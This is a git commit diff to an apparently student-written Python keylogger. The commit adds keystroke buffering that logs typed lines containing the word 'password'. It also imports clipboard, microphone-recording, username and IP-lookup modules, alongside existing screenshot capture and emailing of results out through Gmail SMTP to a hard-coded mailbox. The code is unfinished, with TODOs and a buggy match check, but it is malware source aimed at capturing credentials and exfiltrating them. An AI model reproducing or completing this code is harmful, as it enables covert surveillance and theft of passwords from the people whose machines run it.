1ced8644df4cf75a832359c74213a4055fcac38b
Adam Moren <adam.moren1@gmail.com>
2020-10-11 19:20:57 +0200

    save to file when keyword is mentioned

--- main.py
+++ main.py
@@ -13,9 +13,19 @@ import logging
 from PIL import ImageGrab
 from datetime import datetime
 
+import socket
+import platform
 
+import win32clipboard
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+import getpass
+from requests import get
+
+# TODO: Add folder structure based on date?
 log_directory = ""
-logging.basicConfig(filename="log_results.txt", level=logging.DEBUG)
+logging.basicConfig(filename="log_results.txt", level=logging.DEBUG, format='%(message)s', filemode='w')
 
 sender_email = "tnm031keylogger@gmail.com"
 receiver_email = "tnm031keylogger@gmail.com"
@@ -30,6 +40,9 @@ message["To"] = receiver_email
 message["Subject"] = subject
 
 message.attach(MIMEText(body, "plain"))
+
+# Global storage of keys for the keylogger
+keys = []
 
 
 def screenshot(image_name):
@@ -54,11 +67,30 @@ with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
     server.sendmail(sender_email, receiver_email, text)
 
 
+# TODO: Fix special keys
 def on_press(key):
-    logging.info(str(key))
-    print(key)
+    global keys
+
+    k = str(key).replace("'", "")
+
+    # TODO: Fix functionality for when to take the screenshot
+    # TODO: fix invalid argument for OS
     if key == keyboard.Key.esc:
         screenshot(str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + '.png')
+
+    elif key == keyboard.Key.space:
+        keys.append(" ")
+
+# Save to file if password is mentioned
+    elif key == keyboard.Key.enter:
+        s = "".join(keys)
+        if s.find("password") > 0:
+            logging.info("\n")
+            logging.info(s)
+        else:
+            keys = []
+    else:
+        keys.append(k)
 
 
 if __name__ == '__main__':
